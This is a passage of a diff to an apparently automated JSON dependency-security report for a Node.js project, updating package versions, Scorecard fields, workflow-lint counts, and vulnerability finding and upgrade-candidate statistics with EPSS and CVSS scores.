           "name": "marked",
           "version": "9.1.6",
           "subscore": 0,
-          "scorecard_score": 7.2,
-          "scorecard_top_concerns": [
-            "CII-Best-Practices (0)",
-            "Fuzzing (0)",
-            "SAST (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "metascraper",
           "version": "5.49.24",
           "subscore": 0,
-          "scorecard_score": 2.4,
-          "scorecard_top_concerns": [
-            "Code-Review (0)",
-            "Dangerous-Workflow (0)",
-            "CII-Best-Practices (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "mocha",
           "version": "11.7.6",
           "subscore": 0,
-          "scorecard_score": 7.8,
-          "scorecard_top_concerns": [
-            "CII-Best-Practices (0)",
-            "Fuzzing (0)",
-            "Pinned-Dependencies (3)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "npm-license",
           "version": "0.3.3",
           "subscore": 0,
-          "scorecard_score": 2.4,
-          "scorecard_top_concerns": [
-            "Maintained (0)",
-            "CII-Best-Practices (0)",
-            "Security-Policy (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "prettier",
-          "version": "3.8.4",
+          "version": "3.9.5",
           "subscore": 0,
-          "scorecard_score": 6.4,
-          "scorecard_top_concerns": [
-            "Code-Review (0)",
-            "CII-Best-Practices (0)",
-            "Token-Permissions (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "progress",
           "version": "2.0.3",
           "subscore": 0,
-          "scorecard_score": 2.9,
-          "scorecard_top_concerns": [
-            "Maintained (0)",
-            "CII-Best-Practices (0)",
-            "Security-Policy (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "proxyquire",
           "version": "2.1.3",
           "subscore": 0,
-          "scorecard_score": 3.2,
-          "scorecard_top_concerns": [
-            "Token-Permissions (0)",
-            "Maintained (0)",
-            "Pinned-Dependencies (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "semver",
           "version": "5.7.2",
           "subscore": 0,
-          "scorecard_score": 6.5,
-          "scorecard_top_concerns": [
-            "CII-Best-Practices (0)",
-            "Token-Permissions (0)",
-            "Pinned-Dependencies (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "semver",
           "version": "5.7.2",
           "subscore": 0,
-          "scorecard_score": 6.5,
-          "scorecard_top_concerns": [
-            "CII-Best-Practices (0)",
-            "Token-Permissions (0)",
-            "Pinned-Dependencies (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "semver",
           "version": "6.3.1",
           "subscore": 0,
-          "scorecard_score": 6.5,
-          "scorecard_top_concerns": [
-            "CII-Best-Practices (0)",
-            "Token-Permissions (0)",
-            "Pinned-Dependencies (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "semver",
           "version": "6.3.1",
           "subscore": 0,
-          "scorecard_score": 6.5,
-          "scorecard_top_concerns": [
-            "CII-Best-Practices (0)",
-            "Token-Permissions (0)",
-            "Pinned-Dependencies (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "semver",
           "version": "6.3.1",
           "subscore": 0,
-          "scorecard_score": 6.5,
-          "scorecard_top_concerns": [
-            "CII-Best-Practices (0)",
-            "Token-Permissions (0)",
-            "Pinned-Dependencies (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "semver",
           "version": "6.3.1",
           "subscore": 0,
-          "scorecard_score": 6.5,
-          "scorecard_top_concerns": [
-            "CII-Best-Practices (0)",
-            "Token-Permissions (0)",
-            "Pinned-Dependencies (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "semver",
           "version": "6.3.1",
           "subscore": 0,
-          "scorecard_score": 6.5,
-          "scorecard_top_concerns": [
-            "CII-Best-Practices (0)",
-            "Token-Permissions (0)",
-            "Pinned-Dependencies (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "semver",
           "version": "6.3.1",
           "subscore": 0,
-          "scorecard_score": 6.5,
-          "scorecard_top_concerns": [
-            "CII-Best-Practices (0)",
-            "Token-Permissions (0)",
-            "Pinned-Dependencies (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "semver",
           "version": "6.3.1",
           "subscore": 0,
-          "scorecard_score": 6.5,
-          "scorecard_top_concerns": [
-            "CII-Best-Practices (0)",
-            "Token-Permissions (0)",
-            "Pinned-Dependencies (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "semver",
           "version": "6.3.1",
           "subscore": 0,
-          "scorecard_score": 6.5,
-          "scorecard_top_concerns": [
-            "CII-Best-Practices (0)",
-            "Token-Permissions (0)",
-            "Pinned-Dependencies (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "semver",
           "version": "7.8.5",
           "subscore": 0,
-          "scorecard_score": 6.5,
-          "scorecard_top_concerns": [
-            "CII-Best-Practices (0)",
-            "Token-Permissions (0)",
-            "Pinned-Dependencies (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "shelljs",
           "version": "0.10.0",
           "subscore": 0,
-          "scorecard_score": 4.5,
-          "scorecard_top_concerns": [
-            "Token-Permissions (0)",
-            "CII-Best-Practices (0)",
-            "Pinned-Dependencies (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "sinon",
           "version": "11.1.2",
           "subscore": 0,
-          "scorecard_score": 7.3,
-          "scorecard_top_concerns": [
-            "CII-Best-Practices (0)",
-            "Security-Policy (0)",
-            "Fuzzing (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "typescript",
           "version": "5.6.1-rc",
           "subscore": 0,
-          "scorecard_score": 7.9,
-          "scorecard_top_concerns": [
-            "CII-Best-Practices (0)",
-            "Signed-Releases (0)",
-            "Vulnerabilities (1)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "typescript",
           "version": "6.0.3",
           "subscore": 0,
-          "scorecard_score": 7.9,
-          "scorecard_top_concerns": [
-            "CII-Best-Practices (0)",
-            "Signed-Releases (0)",
-            "Vulnerabilities (1)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "webpack",
-          "version": "5.107.2",
+          "version": "5.108.4",
           "subscore": 0,
-          "scorecard_score": 5.5,
-          "scorecard_top_concerns": [
-            "Token-Permissions (0)",
-            "Binary-Artifacts (0)",
-            "Fuzzing (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         },
         {
           "name": "webpack-cli",
           "version": "4.10.0",
           "subscore": 0,
-          "scorecard_score": 5.6,
-          "scorecard_top_concerns": [
-            "Code-Review (0)",
-            "Token-Permissions (0)",
-            "CII-Best-Practices (0)"
-          ]
+          "scorecard_score": null,
+          "scorecard_top_concerns": []
         }
       ]
     },
@@ -4064,10 +3664,9 @@
       ],
       "zizmor_counts": {
         "low": 22,
-        "high": 44,
-        "medium": 1
+        "high": 45
       },
-      "zizmor_weighted_sum": 1445,
+      "zizmor_weighted_sum": 1460,
       "test_penalty": 0,
       "subscore": 100,
       "test_reality": {
@@ -4115,7 +3714,7 @@
     },
     {
       "package": "@arethetypeswrong/cli",
-      "version": "0.18.4",
+      "version": "0.18.5",
       "is_direct": true,
       "install_key": "node_modules/@arethetypeswrong/cli",
       "parents": [
@@ -4128,7 +3727,7 @@
     },
     {
       "package": "@arethetypeswrong/core",
-      "version": "0.18.4",
+      "version": "0.18.5",
       "is_direct": false,
       "install_key": "node_modules/@arethetypeswrong/core",
       "parents": [
@@ -5670,7 +5269,7 @@
     },
     {
       "package": "@csstools/color-helpers",
-      "version": "6.0.2",
+      "version": "6.1.0",
       "is_direct": false,
       "install_key": "node_modules/@csstools/color-helpers",
       "parents": [
@@ -5708,7 +5307,7 @@
     },
     {
       "package": "@csstools/css-color-parser",
-      "version": "4.1.8",
+      "version": "4.1.9",
       "is_direct": false,
       "install_key": "node_modules/@csstools/css-color-parser",
       "parents": [
@@ -5744,7 +5343,7 @@
     },
     {
       "package": "@csstools/css-syntax-patches-for-csstree",
-      "version": "1.1.5",
+      "version": "1.1.6",
       "is_direct": false,
       "install_key": "node_modules/@csstools/css-syntax-patches-for-csstree",
       "parents": [
@@ -5998,7 +5597,7 @@
     },
     {
       "package": "@eslint/config-helpers",
-      "version": "0.6.0",
+      "version": "0.7.0",
       "is_direct": true,
       "install_key": "node_modules/@eslint/config-helpers",
       "parents": [
@@ -6028,7 +5627,7 @@
     },
     {
       "package": "@eslint/eslintrc",
-      "version": "3.3.5",
+      "version": "3.3.6",
       "is_direct": true,
       "install_key": "node_modules/@eslint/eslintrc",
       "parents": [
@@ -6041,7 +5640,7 @@
     },
     {
       "package": "@eslint/json",
-      "version": "2.0.0",
+      "version": "2.0.1",
       "is_direct": true,
       "install_key": "node_modules/@eslint/json",
       "parents": [
@@ -6290,7 +5889,7 @@
       "path": [
         "root",
         "webpack",
-        "terser-webpack-plugin",
+        "minimizer-webpack-plugin",
         "terser",
         "@jridgewell/source-map"
       ]
@@ -6322,7 +5921,7 @@
         "@jridgewell/gen-mapping",
         "@jridgewell/remapping",
         "@jridgewell/source-map",
-        "terser-webpack-plugin",
+        "minimizer-webpack-plugin",
         "v8-to-istanbul"
       ],
       "path": [
@@ -6412,7 +6011,7 @@
     },
     {
       "package": "@napi-rs/wasm-runtime",
-      "version": "1.1.5",
+      "version": "1.1.6",
       "is_direct": false,
       "install_key": "node_modules/@napi-rs/wasm-runtime",
       "parents": [
@@ -7343,7 +6942,7 @@
     },
     {
       "package": "@types/node",
-      "version": "22.20.0",
+      "version": "22.20.1",
       "is_direct": true,
       "install_key": "node_modules/@types/node",
       "parents": [
@@ -7452,7 +7051,7 @@
     },
     {
       "package": "@typescript-eslint/parser",
-      "version": "8.62.0",
+      "version": "8.65.0",
       "is_direct": true,
       "install_key": "node_modules/@typescript-eslint/parser",
       "parents": [
@@ -7465,7 +7064,7 @@
     },
     {
       "package": "@typescript-eslint/project-service",
-      "version": "8.62.0",
+      "version": "8.65.0",
       "is_direct": false,
       "install_key": "node_modules/@typescript-eslint/project-service",
       "parents": [
@@ -7480,7 +7079,7 @@
     },
     {
       "package": "@typescript-eslint/scope-manager",
-      "version": "8.62.0",
+      "version": "8.65.0",
       "is_direct": false,
       "install_key": "node_modules/@typescript-eslint/scope-manager",
       "parents": [
@@ -7495,7 +7094,7 @@
     },
     {
       "package": "@typescript-eslint/tsconfig-utils",
-      "version": "8.62.0",
+      "version": "8.65.0",
       "is_direct": false,
       "install_key": "node_modules/@typescript-eslint/tsconfig-utils",
       "parents": [
@@ -7512,7 +7111,7 @@
     },
     {
       "package": "@typescript-eslint/types",
-      "version": "8.62.0",
+      "version": "8.65.0",
       "is_direct": false,
       "install_key": "node_modules/@typescript-eslint/types",
       "parents": [
@@ -7532,7 +7131,7 @@
     },
     {
       "package": "@typescript-eslint/typescript-estree",
-      "version": "8.62.0",
+      "version": "8.65.0",
       "is_direct": false,
       "install_key": "node_modules/@typescript-eslint/typescript-estree",
       "parents": [
@@ -7547,7 +7146,7 @@
     },
     {
       "package": "@typescript-eslint/utils",
-      "version": "8.62.0",
+      "version": "8.65.0",
       "is_direct": false,
       "install_key": "node_modules/@typescript-eslint/utils",
       "parents": [
@@ -7561,7 +7160,7 @@
     },
     {
       "package": "@typescript-eslint/visitor-keys",
-      "version": "8.62.0",
+      "version": "8.65.0",
       "is_direct": false,
       "install_key": "node_modules/@typescript-eslint/visitor-keys",
       "parents": [
@@ -8047,7 +7646,7 @@
       "package": "ajv",
       "version": "8.20.0",
       "is_direct": true,
-      "install_key": "node_modules/terser-webpack-plugin/node_modules/ajv",
+      "install_key": "node_modules/minimizer-webpack-plugin/node_modules/ajv",
       "parents": [
         "schema-utils"
       ],
@@ -8107,7 +7706,7 @@
       "package": "ajv-keywords",
       "version": "5.1.0",
       "is_direct": false,
-      "install_key": "node_modules/terser-webpack-plugin/node_modules/ajv-keywords",
+      "install_key": "node_modules/minimizer-webpack-plugin/node_modules/ajv-keywords",
       "parents": [
         "schema-utils"
       ],
@@ -8742,7 +8341,7 @@
     },
     {
       "package": "baseline-browser-mapping",
-      "version": "2.10.38",
+      "version": "2.11.0",
       "is_direct": false,
       "install_key": "node_modules/baseline-browser-mapping",
       "parents": [
@@ -8848,7 +8447,7 @@
     },
     {
       "package": "bn.js",
-      "version": "4.12.3",
+      "version": "4.12.5",
       "is_direct": false,
       "install_key": "node_modules/asn1.js/node_modules/bn.js",
       "parents": [
@@ -8866,7 +8465,7 @@
     },
     {
       "package": "bn.js",
-      "version": "4.12.3",
+      "version": "4.12.5",
       "is_direct": false,
       "install_key": "node_modules/create-ecdh/node_modules/bn.js",
       "parents": [
@@ -8882,7 +8481,7 @@
     },
     {
       "package": "bn.js",
-      "version": "4.12.3",
+      "version": "4.12.5",
       "is_direct": false,
       "install_key": "node_modules/diffie-hellman/node_modules/bn.js",
       "parents": [
@@ -8898,7 +8497,7 @@
     },
     {
       "package": "bn.js",
-      "version": "4.12.3",
+      "version": "4.12.5",
       "is_direct": false,
       "install_key": "node_modules/elliptic/node_modules/bn.js",
       "parents": [
@@ -8915,7 +8514,7 @@
     },
     {
       "package": "bn.js",
-      "version": "4.12.3",
+      "version": "4.12.5",
       "is_direct": false,
       "install_key": "node_modules/miller-rabin/node_modules/bn.js",
       "parents": [
@@ -8932,7 +8531,7 @@
     },
     {
       "package": "bn.js",
-      "version": "4.12.3",
+      "version": "4.12.5",
       "is_direct": false,
       "install_key": "node_modules/public-encrypt/node_modules/bn.js",
       "parents": [
@@ -8948,7 +8547,7 @@
     },
     {
       "package": "bn.js",
-      "version": "5.2.3",
+      "version": "5.2.5",
       "is_direct": false,
       "install_key": "node_modules/bn.js",
       "parents": [
@@ -8983,7 +8582,7 @@
     },
     {
       "package": "brace-expansion",
-      "version": "1.1.15",
+      "version": "1.1.16",
       "is_direct": false,
       "install_key": "node_modules/@eslint/eslintrc/node_modules/brace-expansion",
       "parents": [
@@ -8997,7 +8596,7 @@
     },
     {
       "package": "brace-expansion",
-      "version": "1.1.15",
+      "version": "1.1.16",
       "is_direct": false,
       "install_key": "node_modules/read-package-json/node_modules/brace-expansion",
       "parents": [
@@ -9011,7 +8610,7 @@
     },
     {
       "package": "brace-expansion",
-      "version": "2.1.1",
+      "version": "2.1.2",
       "is_direct": false,
       "install_key": "node_modules/filelist/node_modules/brace-expansion",
       "parents": [
@@ -9025,7 +8624,7 @@
     },
     {
       "package": "brace-expansion",
-      "version": "2.1.1",
+      "version": "2.1.2",
       "is_direct": false,
       "install_key": "node_modules/glob/node_modules/brace-expansion",
       "parents": [
@@ -9039,7 +8638,7 @@
     },
     {
       "package": "brace-expansion",
-      "version": "2.1.1",
+      "version": "2.1.2",
       "is_direct": false,
       "install_key": "node_modules/mocha/node_modules/brace-expansion",
       "parents": [
@@ -9053,7 +8652,7 @@
     },
     {
       "package": "brace-expansion",
-      "version": "5.0.6",
+      "version": "5.0.7",
       "is_direct": false,
       "install_key": "node_modules/brace-expansion",
       "parents": [
@@ -9208,7 +8807,7 @@
     },
     {
       "package": "browserslist",
-      "version": "4.28.4",
+      "version": "4.28.6",
       "is_direct": false,
       "install_key": "node_modules/browserslist",
       "parents": [
@@ -9277,7 +8876,7 @@
       "path": [
         "root",
         "webpack",
-        "terser-webpack-plugin",
+        "minimizer-webpack-plugin",
         "terser",
         "source-map-support",
         "buffer-from"
@@ -9302,7 +8901,7 @@
     },
     {
       "package": "builtin-modules",
-      "version": "5.2.0",
+      "version": "5.3.0",
       "is_direct": false,
       "install_key": "node_modules/builtin-modules",
       "parents": [
@@ -9479,7 +9078,7 @@
     },
     {
       "package": "caniuse-lite",
-      "version": "1.0.30001799",
+      "version": "1.0.30001806",
       "is_direct": false,
       "install_key": "node_modules/caniuse-lite",
       "parents": [
@@ -10123,7 +9722,7 @@
       "path": [
         "root",
         "webpack",
-        "terser-webpack-plugin",
+        "minimizer-webpack-plugin",
         "terser",
         "commander"
       ]
@@ -11324,7 +10923,7 @@
     },
     {
       "package": "electron-to-chromium",
-      "version": "1.5.378",
+      "version": "1.5.394",
       "is_direct": false,
       "install_key": "node_modules/electron-to-chromium",
       "parents": [
@@ -11467,7 +11066,7 @@
     },
     {
       "package": "enhanced-resolve",
-      "version": "5.24.0",
+      "version": "5.24.3",
       "is_direct": false,
       "install_key": "node_modules/enhanced-resolve",
       "parents": [
@@ -11759,7 +11358,7 @@
     },
     {
       "package": "es-module-lexer",
-      "version": "2.1.0",
+      "version": "2.3.1",
       "is_direct": false,
       "install_key": "node_modules/es-module-lexer",
       "parents": [
@@ -11914,7 +11513,7 @@
     },
     {
       "package": "eslint-plugin-eslint-plugin",
-      "version": "7.4.0",
+      "version": "7.5.0",
       "is_direct": true,
       "install_key": "node_modules/eslint-plugin-eslint-plugin",
       "parents": [
@@ -11966,7 +11565,7 @@
     },
     {
       "package": "eslint-plugin-regexp",
-      "version": "3.1.0",
+      "version": "3.1.1",
       "is_direct": false,
       "install_key": "node_modules/eslint-plugin-regexp",
       "parents": [
@@ -12511,7 +12110,7 @@
     },
     {
       "package": "fast-uri",
-      "version": "3.1.2",
+      "version": "3.1.4",
       "is_direct": false,
       "install_key": "node_modules/fast-uri",
       "parents": [
@@ -12926,7 +12525,7 @@
     },
     {
       "package": "fs-extra",
-      "version": "11.3.5",
+      "version": "11.3.6",
       "is_direct": false,
       "install_key": "node_modules/eslint-plugin-expect-type/node_modules/fs-extra",
       "parents": [
@@ -13326,20 +12925,6 @@
       "path": [
         "root",
         "glob-parent"
-      ]
-    },
-    {
-      "package": "glob-to-regexp",
-      "version": "0.4.1",
-      "is_direct": false,
-      "install_key": "node_modules/glob-to-regexp",
-      "parents": [
-        "webpack"
-      ],
-      "path": [
-        "root",
-        "webpack",
-        "glob-to-regexp"
       ]
     },
     {
@@ -13996,7 +13581,7 @@
     },
     {
       "package": "ignore",
-      "version": "7.0.5",
+      "version": "7.0.6",
       "is_direct": true,
       "install_key": "node_modules/@eslint-community/eslint-plugin-eslint-comments/node_modules/ignore",
       "parents": [
@@ -14010,7 +13595,7 @@
     },
     {
       "package": "ignore",
-      "version": "7.0.5",
+      "version": "7.0.6",
       "is_direct": true,
       "install_key": "node_modules/globby/node_modules/ignore",
       "parents": [
@@ -14181,7 +13766,7 @@
     },
     {
       "package": "install-artifact-from-github",
-      "version": "1.6.0",
+      "version": "1.7.0",
       "is_direct": false,
       "install_key": "node_modules/install-artifact-from-github",
       "parents": [
@@ -14998,12 +14583,12 @@
       "is_direct": false,
       "install_key": "node_modules/jest-worker",
       "parents": [
-        "terser-webpack-plugin"
+        "minimizer-webpack-plugin"
       ],
       "path": [
         "root",
         "webpack",
-        "terser-webpack-plugin",
+        "minimizer-webpack-plugin",
         "jest-worker"
       ]
     },
@@ -15054,7 +14639,7 @@
     },
     {
       "package": "js-yaml",
-      "version": "3.14.2",
+      "version": "3.15.0",
       "is_direct": false,
       "install_key": "node_modules/gray-matter/node_modules/js-yaml",
       "parents": [
@@ -15082,7 +14667,7 @@
     },
     {
       "package": "js-yaml",
-      "version": "4.2.0",
+      "version": "4.3.0",
       "is_direct": false,
       "install_key": "node_modules/js-yaml",
       "parents": [
@@ -15244,7 +14829,7 @@
       "package": "json-schema-traverse",
       "version": "1.0.0",
       "is_direct": false,
-      "install_key": "node_modules/terser-webpack-plugin/node_modules/json-schema-traverse",
+      "install_key": "node_modules/minimizer-webpack-plugin/node_modules/json-schema-traverse",
       "parents": [
         "ajv"
       ],
@@ -15454,7 +15039,7 @@
     },
     {
       "package": "knip",
-      "version": "6.18.0",
+      "version": "6.27.0",
       "is_direct": true,
       "install_key": "node_modules/knip",
       "parents": [
@@ -15526,7 +15111,7 @@
     },
     {
       "package": "linkify-it",
-      "version": "5.0.1",
+      "version": "5.0.2",
       "is_direct": false,
       "install_key": "node_modules/linkify-it",
       "parents": [
@@ -15972,7 +15557,7 @@
     },
     {
       "package": "lru-cache",
-      "version": "11.5.1",
+      "version": "11.5.2",
       "is_direct": false,
       "install_key": "node_modules/lru-cache",
       "parents": [
@@ -16064,7 +15649,7 @@
     },
     {
       "package": "markdown-it",
-      "version": "14.2.0",
+      "version": "14.3.0",
       "is_direct": true,
       "install_key": "node_modules/markdown-it",
       "parents": [
@@ -17151,6 +16736,20 @@
       ]
     },
     {
+      "package": "minimizer-webpack-plugin",
+      "version": "5.6.1",
+      "is_direct": false,
+      "install_key": "node_modules/minimizer-webpack-plugin",
+      "parents": [
+        "webpack"
+      ],
+      "path": [
+        "root",
+        "webpack",
+        "minimizer-webpack-plugin"
+      ]
+    },
+    {
       "package": "minipass",
       "version": "7.1.3",
       "is_direct": false,
@@ -17308,7 +16907,7 @@
     },
     {
       "package": "nan",
-      "version": "2.27.0",
+      "version": "2.28.0",
       "is_direct": false,
       "install_key": "node_modules/nan",
       "parents": [
@@ -17412,7 +17011,7 @@
     },
     {
       "package": "node-releases",
-      "version": "2.0.49",
+      "version": "2.0.51",
       "is_direct": false,
       "install_key": "node_modules/node-releases",
       "parents": [
@@ -18511,7 +18110,7 @@
     },
     {
       "package": "picomatch",
-      "version": "4.0.4",
+      "version": "4.0.5",
       "is_direct": false,
       "install_key": "node_modules/picomatch",
       "parents": [
@@ -18634,7 +18233,7 @@
     },
     {
       "package": "prettier",
-      "version": "3.8.4",
+      "version": "3.9.5",
       "is_direct": true,
       "install_key": "node_modules/prettier",
       "parents": [
@@ -19720,14 +19319,14 @@
       "package": "schema-utils",
       "version": "4.3.3",
       "is_direct": false,
-      "install_key": "node_modules/terser-webpack-plugin/node_modules/schema-utils",
+      "install_key": "node_modules/minimizer-webpack-plugin/node_modules/schema-utils",
       "parents": [
-        "terser-webpack-plugin"
+        "minimizer-webpack-plugin"
       ],
       "path": [
         "root",
         "webpack",
-        "terser-webpack-plugin",
+        "minimizer-webpack-plugin",
         "schema-utils"
       ]
     },
@@ -20475,7 +20074,7 @@
       "path": [
         "root",
         "webpack",
-        "terser-webpack-plugin",
+        "minimizer-webpack-plugin",
         "terser",
         "source-map-support",
         "source-map"
@@ -20510,7 +20109,7 @@
       "path": [
         "root",
         "webpack",
-        "terser-webpack-plugin",
+        "minimizer-webpack-plugin",
         "terser",
         "source-map-support"
       ]
@@ -21052,7 +20651,7 @@
       "path": [
         "root",
         "webpack",
-        "terser-webpack-plugin",
+        "minimizer-webpack-plugin",
         "jest-worker",
         "supports-color"
       ]
@@ -21149,7 +20748,7 @@
     },
     {
       "package": "tar",
-      "version": "7.5.16",
+      "version": "7.5.20",
       "is_direct": false,
       "install_key": "node_modules/tar",
       "parents": [
@@ -21166,31 +20765,17 @@
     },
     {
       "package": "terser",
-      "version": "5.48.0",
+      "version": "5.49.0",
       "is_direct": false,
       "install_key": "node_modules/terser",
       "parents": [
-        "terser-webpack-plugin"
+        "minimizer-webpack-plugin"
       ],
       "path": [
         "root",
         "webpack",
-        "terser-webpack-plugin",
+        "minimizer-webpack-plugin",
         "terser"
-      ]
-    },
-    {
-      "package": "terser-webpack-plugin",
-      "version": "5.6.1",
-      "is_direct": false,
-      "install_key": "node_modules/terser-webpack-plugin",
-      "parents": [
-        "webpack"
-      ],
-      "path": [
-        "root",
-        "webpack",
-        "terser-webpack-plugin"
       ]
     },
     {
@@ -21369,7 +20954,7 @@
     },
     {
       "package": "tldts-core",
-      "version": "7.4.4",
+      "version": "7.4.9",
       "is_direct": false,
       "install_key": "node_modules/tldts-core",
       "parents": [
@@ -21465,7 +21050,7 @@
     },
     {
       "package": "tough-cookie",
-      "version": "6.0.1",
+      "version": "6.0.2",
       "is_direct": false,
       "install_key": "node_modules/jsdom/node_modules/tough-cookie",
       "parents": [
@@ -21776,7 +21361,7 @@
     },
     {
       "package": "unbash",
-      "version": "4.0.1",
+      "version": "4.0.3",
       "is_direct": false,
       "install_key": "node_modules/unbash",
       "parents": [
@@ -22334,7 +21919,7 @@
     },
     {
       "package": "webpack",
-      "version": "5.107.2",
+      "version": "5.108.4",
       "is_direct": true,
       "install_key": "node_modules/webpack",
       "parents": [
@@ -22374,7 +21959,7 @@
     },
     {
       "package": "webpack-sources",
-      "version": "3.5.0",
+      "version": "3.5.1",
       "is_direct": false,
       "install_key": "node_modules/webpack-sources",
       "parents": [
@@ -22686,7 +22271,7 @@
     },
     {
       "package": "ws",
-      "version": "8.21.0",
+      "version": "8.21.1",
       "is_direct": false,
       "install_key": "node_modules/ws",
       "parents": [
@@ -22993,38 +22578,39 @@
     }
   ],
   "scan_counts": {
-    "total_findings": 41,
-    "findings_with_fix": 39,
+    "total_findings": 43,
+    "findings_with_fix": 41,
     "findings_no_fix": 2,
     "findings_by_severity": {
-      "high": 19,
-      "medium": 19,
+      "high": 20,
+      "medium": 20,
       "low": 2,
       "critical": 1
     },
-    "high_epss_count": 0,
-    "total_candidates": 12,
+    "high_epss_count": 3,
+    "total_candidates": 11,
     "candidates_auto_merge": 4,
-    "candidates_review_required": 8,
+    "candidates_review_required": 7,
     "candidates_decline": 0,
     "candidates_unknown_tier": 0,
-    "node_count": 1156,
+    "node_count": 1155,
     "clean_node_count": 1142,
-    "affected_node_count": 14,
+    "affected_node_count": 13,
     "affected_package_count": 13,
     "package_status_auto_merge": 4,
-    "package_status_review_required": 8,
+    "package_status_review_required": 7,
     "package_status_decline": 0,
     "package_status_no_fix": 2,
     "package_status_mixed_no_fix": 0,
     "candidates": [
       {
-        "candidate_id": "3dcdde8aefb71b50",
+        "candidate_id": "cd24d099957f01d8",
         "package": "axios",
         "from_version": "0.21.4",
-        "to_version": "0.32.0",
+        "to_version": "0.33.0",
         "tier": "review_required",
         "related_finding_ids": [
+          "02c01841a9b40ae7",
           "0ed2701093142cf8",
           "2ed981a55440532a",
           "3b725689a0b78a02",
@@ -23044,12 +22630,13 @@
           "b9e39b63ff45fb0b",
           "c2d73f6e77eef6b2",
           "d193530a4fa0eb5e",
+          "dd74ad56f4b24dd6",
           "e80b9ad334cae860",
           "f2a0986868a31e96"
         ],
         "aggregates": {
-          "max_epss_score": 0.01242,
-          "max_epss_percentile": 0.65367,
+          "max_epss_score": 0.025,
+          "max_epss_percentile": 0.82956,
           "max_cvss_score": 8.6,
           "severity_min": "high",
           "severity_max": "low",
@@ -23067,7 +22654,7 @@
         ],
         "aggregates": {
           "max_epss_score": 0.00873,
-          "max_epss_percentile": 0.542,
+          "max_epss_percentile": 0.54958,
           "max_cvss_score": 7.5,
           "severity_min": "high",
           "severity_max": "high",
@@ -23084,8 +22671,8 @@
           "f3dc1fe6213652f3"
         ],
         "aggregates": {
-          "max_epss_score": 0.00512,
-          "max_epss_percentile": 0.39551,
+          "max_epss_score": 0.00562,
+          "max_epss_percentile": 0.43092,
           "max_cvss_score": 2.5,
           "severity_min": "low",
           "severity_max": "low",
@@ -23093,37 +22680,20 @@
         }
       },
       {
-        "candidate_id": "c8883580e853cdcc",
-        "package": "js-yaml",
-        "from_version": "3.14.2",
-        "to_version": "4.2.0",
-        "tier": "review_required",
-        "related_finding_ids": [
-          "4db22f51326cf321"
-        ],
-        "aggregates": {
-          "max_epss_score": 0.00251,
-          "max_epss_percentile": 0.1618,
-          "max_cvss_score": 5.3,
-          "severity_min": "medium",
-          "severity_max": "medium",
-          "has_kev": false
-        }
-      },
-      {
-        "candidate_id": "f5514b38e46302bc",
+        "candidate_id": "c85b1dfa6892a9d2",
         "package": "js-yaml",
         "from_version": "4.1.1",
-        "to_version": "4.2.0",
+        "to_version": "4.3.0",
         "tier": "auto_merge",
         "related_finding_ids": [
-          "538452b62c34fbd9"
+          "538452b62c34fbd9",
+          "a0f8ede85ca16b5d"
         ],
         "aggregates": {
-          "max_epss_score": 0.00251,
-          "max_epss_percentile": 0.1618,
-          "max_cvss_score": 5.3,
-          "severity_min": "medium",
+          "max_epss_score": 0.0037,
+          "max_epss_percentile": 0.29385,
+          "max_cvss_score": 7.5,
+          "severity_min": "high",
           "severity_max": "medium",
           "has_kev": false
         }
@@ -23143,8 +22713,8 @@
           "f905369f4c299d86"
         ],
         "aggregates": {
-          "max_epss_score": 0.01026,
-          "max_epss_percentile": 0.59101,
+          "max_epss_score": 0.2241,
+          "max_epss_percentile": 0.97438,
           "max_cvss_score": 8.1,
           "severity_min": "high",
           "severity_max": "medium",
@@ -23161,8 +22731,8 @@
           "192504792c7384b9"
         ],
         "aggregates": {
-          "max_epss_score": 0.00252,
-          "max_epss_percentile": 0.16294,
+          "max_epss_score": 0.00306,
+          "max_epss_percentile": 0.22649,
           "max_cvss_score": 5.3,
           "severity_min": "medium",
           "severity_max": "medium",
@@ -23179,8 +22749,8 @@
           "020ad48f3e889896"
         ],
         "aggregates": {
-          "max_epss_score": 0.02014,
-          "max_epss_percentile": 0.78362,
+          "max_epss_score": 0.02165,
+          "max_epss_percentile": 0.80262,
           "max_cvss_score": 7.5,
           "severity_min": "high",
           "severity_max": "high",
@@ -23198,7 +22768,7 @@
         ],
         "aggregates": {
           "max_epss_score": 0.00351,
-          "max_epss_percentile": 0.26831,
+          "max_epss_percentile": 0.27435,
           "max_cvss_score": 5.3,
           "severity_min": "medium",
           "severity_max": "medium",
@@ -23217,7 +22787,7 @@
         ],
         "aggregates": {
           "max_epss_score": 0.00472,
-          "max_epss_percentile": 0.37158,
